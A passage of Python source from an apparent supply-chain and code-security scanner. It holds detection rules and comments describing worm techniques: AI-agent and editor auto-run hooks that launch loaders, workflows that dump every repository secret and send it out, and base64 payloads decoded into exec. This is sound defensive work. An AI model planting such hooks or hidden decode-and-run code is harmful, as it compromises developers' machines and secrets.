#: '.execute(' * 4000 on one line took 3.3 s — every call re-scanned the rest
#: of the line for its closing paren and re-split it.
SQL_CALLS_PER_LINE = 64
SQL_ARG_MAX = 10000
_PAREN_TOKEN_RE = re.compile(r"[()\"']")


# SC-CHARCODE: String.fromCharCode building text from character codes that
# are written in the code: ten or more 2-3 digit numbers inside the call's
# own parentheses (`fromCharCode(104,116,116,112,…)`, also through .apply /
# .call), or a name the call uses that the same line assigns an array of ten
# or more printable-ASCII codes (`k=[104,116,…];…fromCharCode(...k)`). It
# used to count numbers anywhere on the line, so every fromCharCode on a long
# minified line fired: binary parsers (`fromCharCode(255&e)`,
# `fromCharCode(...u.subarray(0,l))`) and UTF-16 surrogate encoders
# (`fromCharCode(e>>>10&1023|55296)`); and any such array anywhere on the line
# (npm:extract-youtube's 98 KB line) counted for every call on it.
CHARCODE_NUM_RE = re.compile(r"\b\d{2,3}\b")
_CHARCODE_TABLE_RE = re.compile(
    r"(?<![\w$.])([A-Za-z_$][\w$]*)\s*=\s*\[((?:\s*[0-9]{2,3}\s*,){9,}\s*[0-9]{2,3})\s*\]")
# a bare name (not `o.k`; `...k` is a spread)
_CHARCODE_NAME_RE = re.compile(r"(?<![\w$])(?:(?<=\.\.\.)|(?<!\.))[A-Za-z_$][\w$]*")
_CHARCODE_CALL_TAIL_RE = re.compile(r"\s*(?:\.\s*(?:apply|call)\s*)?\(")
CHARCODE_ARGS_MAX = 4000        # chars of one call's arguments searched
# Chars of argument scanning per line; past it a call's arguments are taken to
# run CHARCODE_ARGS_MAX chars (over-counting, never under-counting), so a line
# of 50,000 unclosed calls stays linear.
CHARCODE_SCAN_BUDGET = 200_000


def _call_args_end(line, k, stop):
    """Index of the ')' that closes the '(' at k, or None before `stop`.
    Scanned from k itself, skipping ' " ` strings (with backslash escapes):
    the quote state of a whole minified line is not reliable (a quote in a
    regex or template literal), but the arguments of one call are short."""
    depth, quote, j = 0, None, k
    while j < stop:
        c = line[j]
        if quote is not None:
            if c == "\\":
                j += 2
                continue
            if c == quote:
                quote = None
        elif c in "'\"`":
            quote = c
        elif c == "(":
            depth += 1
        elif c == ")":
            depth -= 1
            if depth == 0:
                return j
        j += 1
    return None


def _charcode_col(line):
    """Column of the String.fromCharCode call that makes `line` SC-CHARCODE,
    or None (see above). Linear: one pass over the numbers, bounded argument
    scans."""
    if CHARCODE_RE.search(line) is None:
        return None
    nums = [m.start() for m in CHARCODE_NUM_RE.finditer(line)]
    if len(nums) < 10:                                    # a code table has ten too
        return None
    tables = {m.group(1) for m in _CHARCODE_TABLE_RE.finditer(line)
              if all(32 <= int(v) <= 126 for v in re.findall(r"[0-9]+", m.group(2)))}
    refs = [m.start() for m in _CHARCODE_NAME_RE.finditer(line) if m.group() in tables] if tables else []
    budget = CHARCODE_SCAN_BUDGET
    for m in CHARCODE_RE.finditer(line):
        t = _CHARCODE_CALL_TAIL_RE.match(line, m.end())
        if t is None:
            continue
        k = t.end() - 1                                   # the '('
        stop = min(len(line), k + CHARCODE_ARGS_MAX)
        end = _call_args_end(line, k, stop) if budget > 0 else None
        e = stop if end is None else end
        budget -= e - k
        if (bisect.bisect_left(nums, e) - bisect.bisect_left(nums, k) >= 10
                or bisect.bisect_left(refs, e) > bisect.bisect_left(refs, k)):
            return m.start()
    return None


def _paren_close_map(line):
    """{index of '(' : index of its matching ')'} for one line, in one pass.
    Quotes are tracked from the start of the line (a '(' inside a string
    literal has no entry); same pairing as _paren_slice otherwise."""
    close, stack, quote = {}, [], None
    for m in _PAREN_TOKEN_RE.finditer(line):
        ch, j = m.group(), m.start()
        if quote:
            if ch == quote:
                quote = None
        elif ch in "\"'":
            quote = ch
        elif ch == "(":
            stack.append(j)
        elif stack:
            close[stack.pop()] = j
    return close


def sql_sink_analyzer(path, lines, issues, ctx=None):
    """Whole-argument analysis of execute()/executemany() calls (G12).
    Appends S-SQL-PY issues to `issues` (deduped against the line-rule pass
    by line number); safe parameterized calls are skipped. `ctx` (scan_file's
    per-file context) supplies the normalized match text and the time budget."""
    match_lines = ctx.mlines if ctx is not None and ctx.lines is lines else lines
    tmap = _sql_template_map(match_lines)
    flagged = {i["line"] for i in issues if i.get("rule") == "S-SQL-PY"}
    for i, line in enumerate(match_lines):
        if i + 1 in flagged or ".execute" not in line:
            continue
        if ctx is not None:
            ctx.check_time()
        close = None
        for n_call, m in enumerate(SQL_CALL_RE.finditer(line)):
            if n_call >= SQL_CALLS_PER_LINE:
                break
            if close is None:
                close = _paren_close_map(line)
            j = close.get(m.end() - 1)
            if j is None:
                continue
            arg_str = line[m.end():j][:SQL_ARG_MAX]
            parts = [p for p in _split_top_level(arg_str)]
            first = parts[0].strip() if parts else ""
            second = parts[1].strip() if len(parts) > 1 else ""
            if not first:
                continue
            # SAFE: parameterized call — literal/identifier first argument and
            # a tuple/list/dict of parameters after the top-level comma
            if len(parts) >= 2 and second and second[0] in "([{":
                continue
            build = _sql_build_method(first)
            if build is None and SQL_IDENT_RE.fullmatch(first):
                build = tmap.get(first)
                if build in (None, "static"):
                    continue
            if build:
                issues.append(_sql_issue(path, i + 1, lines, first, build))

def _paren_slice(line, open_idx):
    """Content of the balanced parenthesized group starting at open_idx (the
    index of '('), or None if unbalanced."""
    depth, quote = 0, None
    for j in range(open_idx, len(line)):
        ch = line[j]
        if quote:
            if ch == quote:
                quote = None
            continue
        if ch in "\"'":
            quote = ch
        elif ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
            if depth == 0:
                return line[open_idx + 1:j]
    return None

def _sql_issue(path, line_no, lines, arg, build):
    how = {"percent": "%-interpolation", "format": ".format()/f-string",
           "concat": "concatenation"}.get(build, "string-building")
    return mk_issue(
        {"id": "S-SQL-PY", "name": "SQL built from strings", "type": "VULN", "sev": "BLOCKER",
         "msg": f"SQL query built with {how} into execute().",
         "why": "Interpolating values into SQL enables SQL injection — the classic path to full database compromise.",
         "fix": 'Use parameterized queries: cursor.execute("SELECT … WHERE id = %s", (user_id,)).',
         "ref": "CWE-89 · OWASP A03"},
        path, line_no, lines)

# ---------------- Linear SQL *-NOWHERE scan (F11) ----------------
# SQL-DELETE-NOWHERE / SQL-UPDATE-NOWHERE are fired by this linear pass, NOT
# by the generic TEXT_RULES finditer (their entry regexes match only the
# statement head and never scan toward EOF). One O(n) pass per file: head
# matches come from the cheap anchored regexes; statement ends come from the
# precomputed ';' offsets (a match with no later ';' never fired the old
# pattern either, so it is skipped — and that is what bounds the work); the
# WHERE check runs on the bounded statement slice only.
_SQL_NOWHERE_RULES = {r["id"]: r for r in TEXT_RULES
                      if r["id"] in ("SQL-DELETE-NOWHERE", "SQL-UPDATE-NOWHERE")}
_SQL_NOWHERE_SKIP = frozenset(_SQL_NOWHERE_RULES)
_SQL_WHERE_RE = re.compile(r"\bWHERE\b", re.I)


def scan_sql_nowhere(path, content, issues, lines):
    """Emit SQL-DELETE-NOWHERE / SQL-UPDATE-NOWHERE in one linear pass.

    Reproduces the original tempered-dot finditer semantics exactly:
      * a match starts at a DELETE/UPDATE head, consumes up to the next ';'
        and is aborted by a WHERE in between (WHERE'd statements do not
        fire, but heads nested after the WHERE can still match);
      * finditer is non-overlapping, so every head before a reported match's
        ';' is consumed by that match (20k unterminated heads before one
        real statement produce ONE issue, at the first head's line);
      * heads after a WHERE-aborted statement are still tried (the old
        engine retried from the next character).
    Cost is O(n) with bisect lookups over precomputed ';', WHERE and newline
    offsets (audit finding F11: 51 s CPU on 280 KB of unterminated DELETEs,
    ~40 min extrapolated to the 2 MB file cap; 735 s reproduced pre-fix).
    """
    import bisect
    semis = None    # lazily: ';' offsets, ascending
    wheres = None   # lazily: \bWHERE\b offsets, ascending
    nl = None       # lazily: '\n' offsets, ascending
    for rid, r in _SQL_NOWHERE_RULES.items():
        skip_to = -1   # heads starting before this offset are consumed/masked
        for m in r["re"].finditer(content):
            if m.start() < skip_to:
                continue
            if semis is None:
                semis = [i for i, ch in enumerate(content) if ch == ";"]
                wheres = [w.start() for w in _SQL_WHERE_RE.finditer(content)]
                nl = [i for i, ch in enumerate(content) if ch == "\n"]
            k = bisect.bisect_left(semis, m.end())
            if k == len(semis):
                continue   # no ';' ahead: the old pattern could never match
            semi = semis[k]
            w = bisect.bisect_left(wheres, m.end())
            if w < len(wheres) and wheres[w] < semi:
                # WHERE before the ';': old match aborted at the WHERE; the
                # engine retried from the next character, so later heads
                # (nested after WHERE) still get their own attempts.
                skip_to = m.end()
                continue
            line_no = bisect.bisect_left(nl, m.start()) + 1
            issues.append(mk_issue(r, path, line_no, lines))
            skip_to = semi  # non-overlapping: heads before the ';' are spent


def normalize_newlines(text):
    """Line endings as text mode reads them: \r\n and a lone \r become \n.
    Project files are read in text mode already; registry archives are decoded
    from bytes, so a package authored on Windows would otherwise leave "\r" on
    every line. Twin of normalizeNewlines in js/src/lib/fs.js."""
    return text.replace("\r\n", "\n").replace("\r", "\n") if "\r" in text else text


#: Per-file time backstop (review fix, shared semantics 14): when the pattern
#: rules on one file have run this many seconds (checked between lines and
#: between passes), the file's scan stops with an SC-TRUNCATED finding. The
#: quadratic regexes themselves are fixed; this only bounds what is left.
SCAN_TIME_BUDGET = 30.0


def scan_file(path, content, lang, dep=False):
    """Scan one file. dep=True → dependency mode: only supply-chain and
    secret rules run (quality/bug rules would be pure noise in vendored code).
    The text is read in Unicode 13.0 on every Python (see _unicode13): a code
    point it leaves unassigned is scanned, and shown, as U+FFFD."""
    return _scan_source(path, content, lang, dep, _scan_file)


def scan_file_after_rules(path, content, lang, rules):
    """scan_file in project mode with its first part already read: `rules`,
    the findings scan_rules gives for the file (the native engine's,
    engine.py), then the passes that follow them, the suppression markers
    and the cap, as scan_file runs them."""
    def scan(path, content, lines, lang, dep, ctx, issues):
        _scan_file(path, content, lines, lang, dep, ctx, issues, rules=rules)
    return _scan_source(path, content, lang, False, scan)


def scan_rules(path, content, lang):
    """The first part of scan_file in project mode (_scan_rules): the
    findings of the pattern rules and the families on every line, the
    file-level ones and the whole-text rules, in scan_file's order, before
    the passes that follow them, the suppression markers and the cap. The
    native engine's scan_rules answers the same (the npm package runs that
    engine and adds the rest itself); the parity tests compare the two."""
    return _scan_source(path, content, lang, False, _scan_rules, finish=False)


def _scan_source(path, content, lang, dep, scan, finish=True):
    """`scan` (_scan_file or _scan_rules) of one file as scan_file reads it,
    then, when `finish`, without what a marker suppresses and capped."""
    lines = source_lines(_unicode13.pin(content), lang)
    content = "\n".join(lines)
    ctx = _FileCtx(lines, lang, content, time.monotonic() + SCAN_TIME_BUDGET, jsx_reading(path))
    outer = getattr(_TLS, "ctx", None)
    _TLS.ctx = ctx
    try:
        issues = []
        try:
            scan(path, content, lines, lang, dep, ctx, issues)
        except _ScanBudgetExceeded:
            issues.append(truncated_issue(path, "scan time budget exceeded"))
        if not finish:
            return issues
        return cap_issues(path, [i for i in issues if not ctx.suppressed(i, dep=dep)], lines)
    finally:
        _TLS.ctx = outer


# ---------------- Config and data files (credentials only) ----------------
# .env, JSON, YAML, TOML, INI, .properties, shell, PEM keys, Dockerfiles,
# .npmrc / .pypirc, Terraform variables (configsecrets.is_config_file): read
# as text and checked by the two credential rules, never as code.
_TOKEN_RULE = next(r for r in RULES if r["id"] == "S-TOKEN")
CONFIG_SECRET_RULE = {
    "id": "S-SECRET", "name": "Hardcoded credential", "type": "VULN", "sev": "BLOCKER",
    "msg": "Credential appears to be hardcoded in a config file.",
    "why": ("Config files are committed, copied into images and shared: a credential in one "
            "leaks with every copy, and rotating it means finding them all."),
    "fix": "Reference it instead (${VAR}, a secrets manager), and rotate this one now.",
    "ref": "CWE-798 · OWASP A07"}


def _config_token_col(line, lines, i):
    """Column of the first S-TOKEN match on a config line that is reported: not
    a documentation sample, and a private-key header only with key material
    after it, on the line or the next two (configsecrets.key_material)."""
    for m in _TOKEN_RULE["re"].finditer(line):
        text = m.group(0)
        if configsecrets.documentation_token(text):
            continue
        if text.startswith("-----BEGIN") and not any(
                configsecrets.key_material(t) for t in [line[m.end():]] + lines[i + 1:i + 3]):
            continue
        return m.start()
    return None


# ---------------- Settings that run commands (SC-AUTORUN) ----------------
# An editor's or an AI agent's settings in the tree that make it run a
# command on its own (autorun: a VS Code folder-open task, a Claude Code,
# Cursor or Gemini CLI hook, an MCP server): INFO inventory — they run with
# the user's privileges whenever the folder is opened or the agent works in
# it — and CRITICAL when the command, or a file of the tree it runs (read
# like an install hook's: follow_hook, install_script_risk), looks hostile,
# or that file is obfuscated. Mini Shai-Hulud and the keyv wave committed a
# SessionStart hook and a folder-open task running the worm's loader
# (`node .claude/setup.mjs`, which fetches Bun to run the payload) to every
# repository they reached. A file that cannot be read as JSON but names what
# its tool runs is MAJOR: the tool may read it more leniently.
AUTORUN_SHOW = 200                 # code points of a command a message shows
_AUTORUN_WHY = (
    "Editors and AI coding agents run these commands on their own — when the folder is opened, a "
    "session starts or the agent uses a tool — with your privileges, without asking each time. The "
    "2026 Shai-Hulud worms (Mini Shai-Hulud, the keyv wave) committed a Claude Code SessionStart hook "
    "and a VS Code folder-open task to every repository they reached, so opening a checkout ran the "
    "worm.")


def _autorun_rule(sev, msg, why, fix):
    return {"id": "SC-AUTORUN", "name": "Settings run a command automatically", "type": "HOTSPOT",
            "sev": sev, "msg": msg, "why": why, "fix": fix, "ref": "CWE-506 · Supply chain"}


_AGENT_SETTINGS_REASON = "writes an AI agent's or editor's auto-run settings"


def _autorun_script_risk(text):
    """install_script_risk for what a settings file runs, but for writing an
    agent's or editor's settings: an agent's own hooks manage them (a
    WorktreeCreate hook copies settings.local.json into the new worktree)."""
    return [r for r in install_script_risk(text) if not r.startswith(_AGENT_SETTINGS_REASON)]


def _autorun_risk(command, base, read):
    """-> (reasons, target): why a command a settings file runs looks hostile,
    and the file of the tree it runs that does (None when it is the command
    itself); ([], None) when nothing does."""
    reasons = []
    hijack = agent_hijack_in_command(command)
    if hijack is not None:
        reasons.append(f'starts the AI agent "{hijack[0]}" with {hijack[1]}')
    reasons.extend(_autorun_script_risk(command))
    if reasons or read is None:
        return reasons, None
    for target in follow_hook(autorun.local_command(command))[0]:
        rel = _tree_join(base, target)
        text = read(rel) if rel is not None else None
        if text is None:
            continue
        found = _autorun_script_risk(text)
        if len(set(OBF_IDENT_RE.findall(text))) >= 5:
            found.append("is obfuscated")
        if found:
            return found, target
        # (0.1.8) the scripts it starts (spawned_scripts): a loader that fetches
        # a runtime and runs a file of the tree with it
        for where, path in spawned_scripts(normalize_newlines(text)):
            srel = _tree_join(posixpath.dirname(rel) if where == "dir" else base, path)
            stext = read(srel) if srel is not None else None
            more = _autorun_script_risk(stext) if stext else []
            if more:
                return [f"starts {srel}, which {'; and '.join(more)}"], target
    return [], None


def autorun_issues(path, lines, read=None):
    """SC-AUTORUN findings for a settings file (autorun.config_kind(path) is
    not None) whose text is lines; read(rel) returns the text of a file of
    the tree ('/'-separated, root-relative) or None, to follow a command into
    the files it runs (None: the commands alone are judged)."""
    kind, tool = autorun.config_kind(path)
    found, error = autorun.entries(kind, tool, "\n".join(lines))
    if error is not None:
        return [mk_issue(_autorun_rule(
            "MAJOR", f"These {tool} settings could not be read as JSON (line {error[0]}: {error[1]}), "
                     f"but they name commands for {tool} to run: read them by hand.",
            _AUTORUN_WHY, "Fix the file so it can be read, and check every command it names.",
        ), path, error[0], lines)]
    base = autorun.owner_dir(path)
    out = []
    for e in found:
        cmd = e["command"]
        if cmd is None:
            out.append(mk_issue(_autorun_rule(
                "INFO", f"{e['trigger']}.", _AUTORUN_WHY + " Listed for inventory.",
                "Check that you added it."), path, e["line"], lines))
            continue
        shown = cmd if len(cmd) <= AUTORUN_SHOW else cmd[:AUTORUN_SHOW] + "…"
        reasons, target = _autorun_risk(cmd, base, read)
        if not reasons:
            out.append(mk_issue(_autorun_rule(
                "INFO", f"{e['trigger']}: {shown!r}.", _AUTORUN_WHY + " Listed for inventory.",
                "Check that you added it, and what it runs."), path, e["line"], lines))
            continue
        said = "; and ".join(reasons)
        msg = (f"{e['trigger']}: {shown!r} — a command that {said}." if target is None else
               f"{e['trigger']}: {shown!r}, which runs {target}; that file {said}.")
        out.append(mk_issue(_autorun_rule(
            "CRITICAL", msg, _AUTORUN_WHY + " This one runs code that looks hostile.",
            "Do not open the folder in the editor or start the agent in it. Remove the entry and what it "
            "runs, find the commit that added them, and rotate the credentials this machine holds if it "
            "already ran."), path, e["line"], lines))
    return out


# ---------------- Workflows the worms planted (SC-WORKFLOW-*) ----------------
_WORKFLOW_SECRETS_WHY = (
    "`${{ toJSON(secrets) }}` is every secret of the repository in one value: a job that holds it can "
    "leak them all, and a workflow that also sends it out is how the Shai-Hulud worms stole secrets "
    "from the repositories they reached (a webhook.site upload, a build artifact).")
_WORKFLOW_BACKDOOR_WHY = (
    "A `${{ … }}` expression is pasted into the script before it runs, so text from an issue, a "
    "discussion or a pull request becomes shell commands; on a self-hosted runner they run on that "
    "machine. The second Shai-Hulud wave registered its victims' machines as self-hosted runners and "
    "planted exactly this workflow (discussion.yaml): opening a discussion ran commands on the victim's "
    "machine.")


def workflow_issues(path, lines):
    """SC-WORKFLOW-SECRETS / SC-WORKFLOW-BACKDOOR for a GitHub Actions workflow
    (ghworkflow.is_workflow(path)) whose text is lines."""
    out = []
    for kind, line, d in ghworkflow.findings("\n".join(lines)):
        if kind == "secrets":
            sent = d["how"] is not None
            out.append(mk_issue({
                "id": "SC-WORKFLOW-SECRETS", "name": "Workflow hands out every secret", "type": "HOTSPOT",
                "sev": "CRITICAL" if sent else "MAJOR",
                "msg": (f"The workflow hands every repository secret to {d['where']} and sends data out "
                        f"({d['how']}): the Shai-Hulud worms planted workflows like this." if sent else
                        f"The workflow hands every repository secret to {d['where']} (toJSON(secrets)): any "
                        f"step there can read them all."),
                "why": _WORKFLOW_SECRETS_WHY,
                "fix": ("Delete the workflow unless you wrote it, then rotate every secret of the repository. "
                        "A job should get only the secrets it uses, by name (${{ secrets.NAME }})."),
                "ref": "CWE-200 · Supply chain"}, path, line, lines))
        else:
            out.append(mk_issue({
                "id": "SC-WORKFLOW-BACKDOOR", "name": "Workflow runs event text on a self-hosted runner",
                "type": "HOTSPOT", "sev": "CRITICAL",
                "msg": (f"The job \"{d['job']}\" puts {d['expr']} into a command on a self-hosted runner, and "
                        f"{d['event']} events start it: anyone who can {d['act']} runs commands on that "
                        f"machine."),
                "why": _WORKFLOW_BACKDOOR_WHY,
                "fix": ("Delete the workflow unless you wrote it, and remove any runner you did not register. "
                        "Otherwise pass the text through an environment variable and quote it in the script."),
                "ref": "CWE-94 · Supply chain"}, path, line, lines))
    return out


def tree_reader(files, configs):
    """read(rel) for autorun_issues: the text of a scanned source or config
    file ('/'-separated, root-relative; a path node would load resolves as
    node_candidates does), with \\n line endings, or None."""
    texts = {}
    for f in list(files) + list(configs):
        texts.setdefault(f["path"].replace(os.sep, "/"), f["content"])

    def read(rel):
        for cand in node_candidates(rel):
            if cand in texts:
                return normalize_newlines(texts[cand])
        return None
    return read


def scan_config_file(path, content, read=None):
    """Credentials in a config or data file (see configsecrets): S-TOKEN on
    every line, S-SECRET outside comments. Nothing else runs — it is not
    code. Suppression markers work in the file's comments, as in code. An
    editor's or AI agent's settings that run commands also get SC-AUTORUN
    (read: see autorun_issues), and a GitHub Actions workflow the
    SC-WORKFLOW-* checks."""
    lines = source_lines(_unicode13.pin(content), "cfg")
    content = "\n".join(lines)
    ctx = _ConfigCtx(lines, "cfg", content, time.monotonic() + SCAN_TIME_BUDGET, False)
    outer = getattr(_TLS, "ctx", None)
    _TLS.ctx = ctx
    try:
        issues = []
        try:
            if autorun.config_kind(path) is not None:
                issues.extend(autorun_issues(path, lines, read))
            if ghworkflow.is_workflow(path):
                issues.extend(workflow_issues(path, lines))
            for i, line in enumerate(lines):
                ctx.check_time()
                if not line or line.isspace():
                    continue
                col = _config_token_col(line, lines, i)
                if col is not None:
                    issues.append(mk_issue(_TOKEN_RULE, path, i + 1, lines, col))
                if not ctx.cmask[i]:
                    col = configsecrets.secret_col(ctx.code[i])
                    if col is not None:
                        issues.append(mk_issue(CONFIG_SECRET_RULE, path, i + 1, lines, col))
        except _ScanBudgetExceeded:
            issues.append(truncated_issue(path, "scan time budget exceeded"))
        return cap_issues(path, [i for i in issues if not ctx.suppressed(i)], lines)
    finally:
        _TLS.ctx = outer


# Rules that also run on comment lines.
_COMMENT_LINE_RULES = frozenset(("Q-TODO", "S-TOKEN", "S-BIDI"))

# ---------------- Decode -> execute across lines (review fix, shared semantics 13) ----------------
# SC-EVAL-DECODE is matched per line, so `eval(\n  atob(…))` and
# `exec(  # nosec\n  base64.b64decode(…))` (the second also dodging the
# "SC-* is unsuppressible" rule by never producing a finding) were missed.
# When a line names a sink and leaves parentheses open (or ends with the
# sink's name), it is joined — comment text removed — with up to
# SC_JOIN_MAX_LINES following lines until the parentheses balance, and the
# rule is matched on the joined statement. A match must begin on the first
# line; the finding is reported there.
SC_JOIN_MAX_LINES = 8
SC_JOIN_MAX_CHARS = 4000        # of following-line text added to one join
_SC_SINK_NAMES = ("eval", "exec", "execSync", "Function",
                  "runInContext", "runInThisContext", "runInNewContext")
_SC_SINK_WORD_RE = re.compile(r"\b(?:eval|exec|execSync|Function|runIn(?:This|New)?Context)\b|" + _EVAL_BY_NAME)


def _paren_balance(code):
    t = STRING_LIT_RE.sub("", code)
    return t.count("(") - t.count(")")


def _joined_eval_decode(ctx, i, rule_re):
    """Column (on line i) of an SC-EVAL-DECODE match over the statement that
    starts on line i and continues on the next lines, or None."""
    code = ctx.mcode(i)
    if not _SC_SINK_WORD_RE.search(code):
        return None
    depth = _paren_balance(code)
    if depth <= 0 and not code.rstrip().endswith(_SC_SINK_NAMES):
        return None
    parts, added = [code], 0
    for k in range(i + 1, min(len(ctx.lines), i + 1 + SC_JOIN_MAX_LINES)):
        if ctx.cmask[k]:
            continue
        nxt = ctx.mcode(k)
        parts.append(nxt)
        added += len(nxt)
        depth += _paren_balance(nxt)
        if (depth <= 0 and nxt.strip()) or added > SC_JOIN_MAX_CHARS:
            break
    m = rule_re.search(" ".join(parts))
    return m.start() if m and m.start() < len(code) else None


# Dependency mode also follows a decoded value through variables: a name
# assigned from a decode call (atob, Buffer.from(…, 'base64'), b64decode,
# bytes.fromhex, codecs.decode, unhexlify, zlib.decompress — member prefixes
# allowed), or from an expression naming such a variable, that later appears
# in the arguments of eval / exec / execSync / execFile(Sync) / spawn(Sync) /
# Function / new Function / vm.runIn*Context is SC-EVAL-DECODE at the sink.
# Statements on one line are processed left to right (`const d = atob(p);
# eval(d)`). Names are never un-tainted (over-approximation is the safe
# direction for third-party code). Project mode covers this with T-CODE/T-CMD.
# A decode call written directly in a sink's arguments counts too
# (`cp.exec(atob(p))`, which the per-line rule no longer sees for aliases).
#
# `exec` and `eval` are sinks when called bare (`exec(d)`, JavaScript names
# imported from child_process), on a global object (`window.eval`,
# `globalThis.eval`), on Python's builtins, or on child_process itself, a
# require("child_process") call or a name assigned from one. Any other
# method call is not code execution: `re.exec(t)` / `/…/.exec(t)` is
# RegExp.prototype.exec (the `for (re.lastIndex = 0; (m = re.exec(t));)`
# loop of every bundler's output), `session.exec(q)` a database call. The
# other sink names are distinctive and count on any receiver.
_DECODE_CALL_SRC = (
    r"(?:\batob|\bb64decode|\.\s*fromhex|\bunhexlify|\b" + _module_ref("codecs") + r"\s*\.\s*decode"
    r"|\b" + _module_ref("zlib") + r"\s*\.\s*decompress|\.\s*decrypt)\s*\("
    r"|\bBuffer\s*\.\s*from\s*\([^;\n]{0,300}?['\"`]base64['\"`]")
_DECODE_CALL_RE = re.compile(_DECODE_CALL_SRC)
# A decoder imported under another name, whose calls decode too: `from base64
# import b64decode as invoke` then `exec(invoke('aW1w…'))` hid a payload from
# the decode flow in two malicious PyPI packages. (`.decrypt(` — a Fernet or
# AES cipher's — is a decode call of its own: `exec(Fernet(k).decrypt(t))`.)
_DECODER_IMPORT_RE = re.compile(
    r"^[ \t]*from[ \t]+(?:base64|binascii|codecs|zlib|marshal|bz2|lzma|gzip)[ \t]+import[ \t]+([^\n#]{1,300})", re.M)
_DECODER_NAMES = frozenset((
    "b64decode", "b32decode", "b85decode", "a85decode", "decodebytes", "standard_b64decode", "urlsafe_b64decode",
    "unhexlify", "a2b_base64", "a2b_hex", "decode", "decompress", "loads"))
_PLAIN_NAME_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")


def _decoder_aliases(text):
    """Names a Python file binds to a decoder with `from … import d as name`."""
    out = []
    if "import" not in text or " as " not in text:
        return out
    for m in _DECODER_IMPORT_RE.finditer(text):
        for part in m.group(1).replace("(", " ").replace(")", " ").split(","):
            bits = part.split()
            if (len(bits) == 3 and bits[1] == "as" and bits[0] in _DECODER_NAMES
                    and _PLAIN_NAME_RE.match(bits[2]) and bits[2] not in out):
                out.append(bits[2])
    return out[:20]


def _file_decode_re(content):
    """_DECODE_CALL_RE, with the calls of the file's decoder aliases."""
    aliases = _decoder_aliases(content)
    if not aliases:
        return _DECODE_CALL_RE
    return re.compile(_DECODE_CALL_SRC + r"|(?<![\w.])(?:" + "|".join(aliases) + r")\s*\(")
# The receiver starts at an identifier boundary: without (?<![\w$]) every
# position inside a long identifier retried the whole rest of it ('a' * 20,000
# on one line: 4.8 s).
_DECODE_SINK_RE = re.compile(
    r"(?:(?<![\w$])(require\s*\(\s*['\"`][ \w:]*['\"`]\s*\)|[A-Za-z_$][\w$]*)\s*\.\s*)?"
    r"(?<![\w$])(eval|exec|execSync|execFile|execFileSync|spawn|spawnSync|Function"
    r"|runIn(?:This|New)?Context)\s*\(")
_GLOBAL_EVAL_RECEIVERS = frozenset(("window", "globalThis", "self", "global", "top", "parent",
                                    "frames", "builtins", "__builtins__"))
# The indirect calls of eval / Function (_INDIRECT_EVAL) as sinks of the
# flow: each match ends at the call's '(' (a thisArg in the arguments names
# no decoded value). Matched on the line as written, since a computed
# member's name is a string literal; a match must start outside one.
_INDIRECT_SINK_RE = re.compile(
    r"\(\s*(?:void\s+)?[\w$.]+\s*,\s*" + _GLOBAL_OBJECT + r"(?:eval|Function)\s*\)\s*\("
    r"|\b(?:eval|Function)\s*\.\s*(?:call|apply)\s*\("
    r"|\b(?:eval|Function)\s*\.\s*bind\s*\([^()]*\)\s*\("
    r"|\bReflect\s*\.\s*apply\s*\((?=\s*" + _GLOBAL_OBJECT + r"(?:eval|Function)\s*,)"
    r"|" + _EVAL_BY_NAME + r"\s*\(")
_CHILD_PROCESS_RE = re.compile(r"['\"`](?:node:)?child_process['\"`]")
_CP_ALIAS_RE = re.compile(
    r"(?<![\w$.])([A-Za-z_$][\w$]*)\s*=\s*(?:await\s+)?(?:require|import)\s*\(\s*"
    r"['\"`](?:node:)?child_process['\"`]\s*\)"
    r"|\bimport\s+(?:\*\s*as\s+)?([A-Za-z_$][\w$]*)\s+from\s*['\"`](?:node:)?child_process['\"`]")


def _child_process_aliases(content):
    """Names bound to the child_process module in this file."""
    if "child_process" not in content:
        return frozenset()
    return frozenset(m.group(1) or m.group(2) for m in _CP_ALIAS_RE.finditer(content))


def _is_code_sink(code, m, cp_aliases):
    """Is this _DECODE_SINK_RE match (found in the string-blanked text of
    `code`) a call that runs code? See the comment above _DECODE_CALL_RE."""
    name = m.group(2)
    if name not in ("eval", "exec"):
        return True
    if m.group(1) is None:
        j = m.start(2) - 1
        while j >= 0 and code[j] in " \t":
            j -= 1
        return j < 0 or code[j] != "."        # `foo().exec(` / `/re/.exec(`: a method
    recv = code[m.start(1):m.end(1)]
    if recv.startswith("require"):
        return name == "exec" and _CHILD_PROCESS_RE.search(recv) is not None
    if recv in _GLOBAL_EVAL_RECEIVERS:
        return name == "eval" or recv in ("builtins", "__builtins__")
    return name == "exec" and (recv == "child_process" or recv in cp_aliases)
_DEP_ASSIGN_RE = re.compile(r"(?<![\w$])([A-Za-z_$][\w$]*)\s*=(?![=>])([^;]*)")
DEP_SINK_ARGS_MAX = 1000        # chars of a sink's arguments searched for decoded names


def _blank_strings(code):
    """`code` with the contents of its string literals replaced by spaces
    (same length, quotes kept) so identifiers inside strings do not count."""
    return STRING_LIT_RE.sub(lambda m: m.group()[0] + " " * (len(m.group()) - 2) + m.group()[-1],
                             code)


# A decoded value taints names for DEP_FLOW_WINDOW characters from the
# decode (a dropper decodes and runs its payload together). Names are
# tracked without scopes, so without a bound one ordinary decode in a large
# bundle spread through helper parameters to thousands of names: npm:pullfrog's
# 7.8 MB dist/index.js loads undici's WebAssembly parser with
# `mod = …compile(Buffer.from(…, "base64"))` at line 7310, and esbuild's
# `__importStar(mod)` helper carried the mark to 6,216 names, every spawn in
# the file among them.
DEP_FLOW_WINDOW = 10_000
_DECODE_FLOW_MSG = "Decoded payload (assigned at line {line}) reaches a code-execution sink."
_DECODE_SAME_CALL_MSG = "Decoded payload reaches a code-execution sink in the same call."
# `function exec(`, `function* exec(`, `def exec(`: a definition (on the 24 chars before the name)
_FN_DEF_BEFORE_RE = re.compile(r"(?:^|[^\w$])(?:function\s*\*?|def)\s*$")


def _dep_decode_flow(path, ctx, issues):
    rule = next(r for r in RULES if r["id"] == "SC-EVAL-DECODE")
    ident_re = _IDENT_RUN_RE.get(ctx.lang, _IDENT_RUN_RE["js"])
    have = {i["line"] for i in issues if i["rule"] == "SC-EVAL-DECODE"}
    cp_aliases = _child_process_aliases(ctx.content) if ctx.lang == "js" else frozenset()
    decoded = {}                      # name -> (line of the decode, its offset in the file)
    offset = 0                        # offset of line i in the file
    decode_re = _file_decode_re(ctx.content) if ctx.lang == "py" else _DECODE_CALL_RE
    for i in range(len(ctx.lines)):
        base, offset = offset, offset + len(ctx.lines[i]) + 1
        if ctx.cmask[i]:
            continue
        code = ctx.mcode(i)
        if not code or code.isspace():
            continue
